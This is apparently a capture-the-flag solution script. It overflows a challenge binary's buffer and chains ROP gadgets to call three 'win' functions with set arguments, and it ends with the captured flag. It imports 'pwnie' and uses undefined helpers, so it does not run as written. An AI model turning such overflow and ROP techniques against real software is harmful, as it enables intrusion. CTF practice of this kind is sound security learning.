#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

# context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.6", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        # Escape curly braces in the f-string below by doubling them:
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg

b *main+519
b *0x4014D9

c
'''

p = start()

# ==================== EXPLOIT ====================

def exploit():

    ret = 0x40101a
    pop_rdi = 0x4017e7
    pop_rsi_r15 = 0x401851
    pop_rdx = 0x4017eb

    sla(b'> ', b'2')
    sla(b'> ', b'1')
    sla(b'> ', b'4')

    sl(b'A'*0x98 + p64(ret) + p64(exe.sym.win1))

    payload = flat(

        ret,
        pop_rdi, 0xdeadbeef,
        exe.sym.win2
    )

    sl(b'B'*0x28 + payload)

    payload = flat(

        ret,
        pop_rdi, 0xdeadbeef,
        pop_rsi_r15, 0xDEAFFACE, 0,
        pop_rdx, 0xFEEDCAFE,
        exe.sym.win3
    )

    sl(b'B'*0x30 + payload)

    interactive()

if __name__ == '__main__':
    exploit()

# DawgCTF{C0ngR4tul4t10ns_d15c1p13_y0u_4r3_r34dy_2_pwn!}